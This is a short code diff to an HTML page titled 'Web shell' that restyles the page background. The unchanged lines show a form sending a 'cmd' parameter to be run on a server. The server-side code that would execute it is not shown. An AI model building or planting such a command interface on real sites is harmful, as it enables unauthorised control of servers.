@@ -2,8 +2,13 @@
 <html>
 <head>
   <title>Web shell</title>
+  <style>
+    body {
+      background: #222222
+    }
+  </style>
 </head>
-<body style="background-color:black">
+<body>
   <form method="get" name="webshell">
     <input type="text" name="cmd">
     <input type="submit" value="run">
